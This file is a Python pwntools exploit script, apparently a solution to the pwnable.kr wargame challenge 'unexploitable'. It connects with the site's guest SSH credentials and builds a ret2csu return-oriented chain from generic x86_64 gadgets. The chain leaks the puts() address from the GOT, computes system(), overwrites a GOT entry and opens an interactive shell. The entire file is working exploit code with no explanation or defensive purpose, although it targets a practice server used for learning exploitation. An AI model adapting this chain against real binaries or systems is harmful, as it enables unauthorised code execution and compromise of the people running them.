#!/usr/bin/env python2
from pwn import *

s = ssh(host="pwnable.kr", user="unexploitable", port=2222, password="guest")
s.download_file("unexploitable")
s.download_file("/lib/x86_64-linux-gnu/libc.so.6")

bin = ELF("./unexploitable")
libc = ELF("libc.so.6")

io = s.run("/home/unexploitable/unexploitable")

#x86_64 particular gadget, may be can be finded on any ELF64 binary
general_gg1 = 0x00000000004005F6
general_gg2 = 0x00000000004005E0 

def ropfunc(function, arg1=0, arg2=0, arg3=0):
    padding = ""
    padding += p64(general_gg1)
    padding += "P" * 8
    padding += p64(0)
    padding += p64(1)
    padding += p64(bin.got[function])
    padding += p64(arg1)
    padding += p64(arg2)
    padding += p64(arg3)
    padding += p64(general_gg2)
    padding += "P" * 0x38
    return padding

shellcode = "A"*16 + "B"*8
shellcode += ropfunc("puts", bin.got["puts"])
shellcode += ropfunc("read", 0, bin.got["__libc_start_main"], 16)
shellcode += ropfunc("__libc_start_main", bin.got["__libc_start_main"] + 8) # as system("sh")

io.recvuntil("otherwise :)"+"\n")
io.send(shellcode + "\n")

putsaddr = io.recvuntil("\n").strip("\n")
putsaddr = u64(putsaddr + (8-len(putsaddr))*"\x00")
print "[+] leak puts() addr: ", hex(putsaddr)
system_addr = putsaddr - libc.symbols["puts"]+ libc.symbols["system"]
print "[+] leak system() addr: ", hex(system_addr)

shellcode2 = p64(system_addr)
shellcode2 += "sh\x00\x00\x00\x00\x00\x00"
io.sendline(shellcode2)
io.interactive()

